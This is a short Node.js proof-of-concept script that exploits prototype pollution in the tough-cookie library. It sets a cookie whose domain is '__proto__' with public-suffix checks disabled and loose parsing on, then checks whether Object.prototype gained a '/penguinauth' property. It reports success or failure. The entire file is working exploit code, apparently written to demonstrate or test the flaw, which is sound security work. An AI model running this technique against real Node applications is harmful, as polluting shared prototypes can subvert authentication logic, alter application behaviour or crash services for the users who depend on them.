async function cookieExploit() {
    try {
        var tough = require("tough-cookie");
        var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "PenguinCookie=verySecureAuth; Domain=penguininc.com; Path=/penguinauth",
                "https://penguininc.com/",
                { loose: true },
                (err, cookie) => {
                    if (err) {
                        reject(err);
                    } else {
                        resolve(cookie);
                    }
                }
            );
        });

        await new Promise((resolve, reject) => {
            cookiejar.setCookie(
                "PenguinCookie=polluted; Domain=__proto__; Path=/penguinauth",
                "https://__proto__/penguin-admin",
                { loose: true },
                (err, cookie) => {
                    resolve();
                }
            );
        });

        if (Object.prototype["/penguinauth"] !== undefined || {}["/penguinauth"] !== undefined) {
            console.log("EXPLOIT SUCCESSFUL");
        } else {
            console.log("EXPLOIT FAILED");
        }

    } catch (error) {
        console.error("Error:", error);
        console.log("EXPLOIT FAILED");
    }
}

cookieExploit();
